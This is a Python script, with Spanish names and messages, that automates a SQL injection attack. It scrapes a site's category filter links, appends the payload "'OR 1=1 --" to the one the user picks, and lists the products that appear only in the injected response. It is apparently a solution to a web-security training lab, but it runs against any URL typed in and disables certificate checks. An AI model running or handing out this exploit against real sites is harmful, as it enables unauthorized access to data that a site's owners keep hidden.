import requests
import sys
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def encontrar_links_ataque(url):
    r = requests.get(url, verify = False)
    soup = BeautifulSoup(r.text, 'html.parser')
    categorias = soup.find_all('a', class_='filter-category')
    print("\nSe han encontrado los siguientes links para realizar el ataque:\n")
    
    for i in range(len(categorias)):
        if i>0:
            print(f"{i}. {categorias[i].text} Enlace de ataque: {categorias[i]['href']}")
    
    print("\nIngrese el indice del enlace para realizar el ataque: ", end="")
    indice = int(input())
        
    return categorias[indice]['href']
    
def peticion_normal(url):
    return requests.get(url).text

def peticion_vulnerada(url, uri):
    sql_payload = "'OR 1=1 --"
    print(f"\nAtacando la url: {url}{uri[1:]}{sql_payload}")
    return requests.get(f"{url}{uri[1:]}{sql_payload}").text

def analisis(html_normal, html_vulnerado):
    PARSER = 'html.parser'
    soup_normal = BeautifulSoup(html_normal, PARSER)
    soup_vulnerado = BeautifulSoup(html_vulnerado, PARSER)
    
    lista_productos_normal = soup_normal.find_all('h3')
    lista_productos_vulnerado = soup_vulnerado.find_all('h3')
    
    lista_oculto = []
    for item in lista_productos_vulnerado:
        if item not in lista_productos_normal:
            lista_oculto.append(item)

    print("\nLista de productos ocultos:\n")
    
    for item in lista_oculto:
        print(item.text)
    
    print("\nSQL injection ejecutada con éxito")
    
def main():
    print("\nIngrese la url del sitio: ", end="")
    url = input()
    uri = encontrar_links_ataque(url)
    html_normal = peticion_normal(url)
    html_vulnerado = peticion_vulnerada(url, uri)
    analisis(html_normal, html_vulnerado)
    

if __name__ == "__main__":
    main()